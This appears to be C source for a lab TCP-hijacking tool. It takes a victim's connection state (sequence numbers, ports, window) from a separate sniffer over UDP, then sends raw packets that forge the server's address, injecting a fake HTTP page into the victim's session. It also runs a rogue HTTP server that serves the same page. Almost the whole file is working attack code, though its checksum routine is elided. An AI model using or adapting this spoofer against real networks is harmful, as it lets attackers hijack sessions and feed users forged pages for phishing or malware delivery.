#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdarg.h>
#include <pthread.h>

#define PORT 9090
#define BUFFER_SIZE 1024
#define CLIENT_PORT 8081
#define LOCAL_SERVER_HOST "172.20.0.104"
#define VICTIM_IP "172.20.0.102"
#define INDEX_HTML_PATH "./index.html"
#define MAX_HTML_SIZE 4096
#define HTTP_PORT 80

// HTTP response template
#define FAKE_RESPONSE "HTTP/1.1 200 OK\r\n" \
    "Content-Type: text/html\r\n" \
    "Content-Length: %lu\r\n" \
    "Connection: close\r\n\r\n%s"

// Structure to store connection details
struct conn_info {
    uint32_t seq;
    uint32_t ack;
    uint16_t sport;
    uint16_t dport;
    uint16_t window;
    uint8_t flags;
};

// Function to read HTML file
char* read_html_file() {
    static char html_content[MAX_HTML_SIZE];
    FILE *fp = fopen(INDEX_HTML_PATH, "r");
    if (!fp) {
        printf("Error opening index.html: %s\n", strerror(errno));
        return NULL;
    }
    
    size_t bytes_read = fread(html_content, 1, MAX_HTML_SIZE - 1, fp);
    fclose(fp);
    
    if (bytes_read == 0) {
        printf("Error reading index.html\n");
        return NULL;
    }
    
    html_content[bytes_read] = '\0';
    return html_content;
}

void error(const char *msg) {
    perror(msg);
    exit(1);
}

void debug_log(const char *format, ...) {
    va_list args;
    va_start(args, format);
    time_t now = time(NULL);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    printf("[DEBUG %s] ", timestamp);
    vprintf(format, args);
    printf("\n");
    fflush(stdout);
    va_end(args);
}

void send_fake_response(const char *response, const char *victim_ip, struct conn_info *conn) {
    printf("[INFO] Preparing spoofed response to %s:%d\n", 
           victim_ip, conn->sport);

    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sd < 0) {
        perror("[ERROR] Socket creation failed");
        return;
    }

    printf("[INFO] Raw socket created\n");

    // Like ICMP example, prepare packet buffer
    char packet[4096];
    memset(packet, 0, sizeof(packet));
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

    // Setup IP header like ICMP example
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(response));
    ip->id = htons(rand());
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = inet_addr(LOCAL_SERVER_HOST);
    ip->daddr = inet_addr(victim_ip);

    // Setup TCP header with exact connection state
    tcp->th_sport = htons(80);
    tcp->th_dport = htons(conn->sport);
    tcp->th_seq = htonl(conn->ack);  // Use their ACK as our SEQ
    tcp->th_ack = htonl(conn->seq + 1);  // Increment their SEQ
    tcp->th_off = 5;
    tcp->th_flags = TH_PUSH | TH_ACK;
    tcp->th_win = htons(conn->window);

    // Copy response data
    memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), 
           response, strlen(response));

    printf("[DEBUG] Spoofed response created with SEQ=%u ACK=%u\n",
           ntohl(tcp->th_seq), ntohl(tcp->th_ack));

    // Calculate checksums like ICMP example
    // ...existing checksum code...

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = ip->daddr;

    // Send multiple times like ICMP example
    for(int i = 0; i < 3; i++) {
        if (sendto(sd, packet, ntohs(ip->tot_len), 0,
            (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("[ERROR] sendto() failed");
        } else {
            printf("[SUCCESS] Spoofed response %d sent to %s:%d\n",
                   i+1, victim_ip, conn->sport);
        }
        usleep(1000);
    }

    close(sd);
}

void handle_victim_request(const char *buffer, struct sockaddr_in *clientaddr, socklen_t len, int sockfd) {
    struct conn_info conn;
    char data[4096];
    
    // Parse full connection info
    sscanf(buffer, "VICTIM_HTTP\n"
           "SEQ=%u\n"
           "ACK=%u\n"
           "SPORT=%hu\n"
           "DPORT=%hu\n"
           "WINDOW=%hu\n"
           "FLAGS=%hhx\n"
           "DATA=%[^\n]",
           &conn.seq, &conn.ack,
           &conn.sport, &conn.dport,
           &conn.window, &conn.flags,
           data);

    // Send spoofed response with exact connection state
    char *html = read_html_file();
    if (html) {
        send_fake_response(html, VICTIM_IP, &conn);
    }

    // Send acknowledgment to sniffer
    const char *ack = "ACK: Request processed";
    sendto(sockfd, ack, strlen(ack), 0, 
           (struct sockaddr *)clientaddr, len);
}

// Add TCP server thread function
void *handle_http_server(void *arg) {
    int server_fd;
    struct sockaddr_in address;
    
    // Create TCP socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("HTTP socket failed");
        return NULL;
    }
    
    // Enable socket reuse
    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        perror("setsockopt");
        return NULL;
    }
    
    // Bind to specific IP instead of INADDR_ANY
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(LOCAL_SERVER_HOST); // Bind to server IP
    address.sin_port = htons(HTTP_PORT);
    
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("HTTP bind failed");
        return NULL;
    }
    
    if (listen(server_fd, 10) < 0) {
        perror("HTTP listen");
        return NULL;
    }

    printf("[+] HTTP server listening on %s:%d\n", LOCAL_SERVER_HOST, HTTP_PORT);
    
    while(1) {
        int addrlen = sizeof(address);
        int new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
        if (new_socket < 0) {
            perror("accept");
            continue;
        }

        // Read the HTTP request
        char request[1024] = {0};
        read(new_socket, request, sizeof(request));
        printf("[+] Received HTTP request:\n%s\n", request);

        // Send fake response
        char *html_content = read_html_file();
        if (html_content) {
            char response[MAX_HTML_SIZE + 512];
            snprintf(response, sizeof(response),
                    "HTTP/1.1 200 OK\r\n"
                    "Server: FakeServer\r\n"
                    "Content-Type: text/html\r\n"
                    "Content-Length: %lu\r\n"
                    "Connection: close\r\n"
                    "\r\n"
                    "%s",
                    strlen(html_content), html_content);

            write(new_socket, response, strlen(response));
            printf("[+] Sent fake webpage\n");
        }
        
        close(new_socket);
    }
    
    return NULL;
}

int main() {
    // Add thread for HTTP server
    pthread_t http_thread;
    if (pthread_create(&http_thread, NULL, handle_http_server, NULL) != 0) {
        perror("Failed to create HTTP server thread");
        exit(1);
    }

    int sockfd;
    struct sockaddr_in servaddr, clientaddr, forwardaddr;
    char buffer[BUFFER_SIZE];
    socklen_t len;

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        error("Socket creation failed");
    }

    // Enable address reuse
    int optval = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        error("setsockopt SO_REUSEADDR failed");
    }

    // Enable broadcast capability
    if (setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &optval, sizeof(optval)) < 0) {
        error("setsockopt SO_BROADCAST failed");
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = INADDR_ANY;
    servaddr.sin_port = htons(PORT);

    if (bind(sockfd, (const struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        error("Bind failed");
    }

    printf("UDP server is running on port %d...\n", PORT);
    printf("Server IP: 0.0.0.0 (listening on all interfaces)\n");
    printf("Waiting for messages from sniffer...\n");
    fflush(stdout);  // Ensure output is displayed immediately

    while (1) {
        len = sizeof(clientaddr);
        printf("\nReady to receive data...\n");
        fflush(stdout);
        
        int n = recvfrom(sockfd, buffer, BUFFER_SIZE-1, 0, 
                        (struct sockaddr *)&clientaddr, &len);
        if (n < 0) {
            printf("Error receiving data: %s (errno: %d)\n", strerror(errno), errno);
            continue;
        }
        
        // Process received data
        buffer[n] = '\0';
        time_t now = time(NULL);
        char timestamp[64];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
        
        printf("\n[%s] Received message from %s:%d\n", 
               timestamp, inet_ntoa(clientaddr.sin_addr), 
               ntohs(clientaddr.sin_port));
        printf("Message content (%d bytes): %s\n", n, buffer);
        fflush(stdout);

        // Handle message based on type
        if (strstr(buffer, "VICTIM_") != NULL) {
            handle_victim_request(buffer, &clientaddr, len, sockfd);
            printf("[*] Local Server: %s:%d\n", LOCAL_SERVER_HOST, PORT);
            printf("[*] Victim IP: %s\n", VICTIM_IP);
            fflush(stdout);
        } else {
            // Send acknowledgment
            const char *ack_msg = "Message received and processed by local server";
            if (sendto(sockfd, ack_msg, strlen(ack_msg), 0, 
                      (struct sockaddr *)&clientaddr, len) < 0) {
                perror("Error sending acknowledgment");
            } else {
                printf("Acknowledgment sent to sniffer\n");
            }
        }
    }  // end while

    close(sockfd);
    return 0;
}  // end main